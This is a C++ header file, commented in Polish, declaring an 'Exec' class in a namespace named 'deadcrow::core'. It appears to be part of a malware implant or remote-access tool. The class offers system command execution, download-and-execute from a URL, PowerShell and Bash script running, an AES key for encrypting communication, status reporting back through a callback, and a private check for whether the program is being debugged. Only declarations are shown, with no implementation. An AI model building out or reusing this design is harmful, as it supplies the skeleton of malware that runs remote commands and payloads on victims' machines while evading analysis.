#pragma once

#include <string>
#include <vector>
#include <functional>

namespace deadcrow {
namespace core {

class Exec {
public:
    // Konstruktor
    Exec(const std::string& aes_key);
    
    // Wykonanie komendy systemowej
    bool executeCommand(const std::string& command, std::string& output);
    
    // Pobranie i wykonanie pliku z URL
    bool downloadAndExecute(const std::string& url, const std::string& output_path = "");
    
    // Wykonanie skryptu PowerShell (tylko Windows)
    bool executePowerShell(const std::string& script, std::string& output);
    
    // Wykonanie skryptu Bash (tylko Linux)
    bool executeBash(const std::string& script, std::string& output);
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
private:
    // Klucz AES do szyfrowania komunikacji
    std::string aes_key_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Sprawdzanie, czy nie jesteśmy debugowani
    bool checkForDebugging();
    
    // Pobranie pliku z URL
    bool downloadFile(const std::string& url, const std::string& output_path);
    
    // Wykonanie pliku
    bool executeFile(const std::string& path);
};

} // namespace core
} // namespace deadcrow
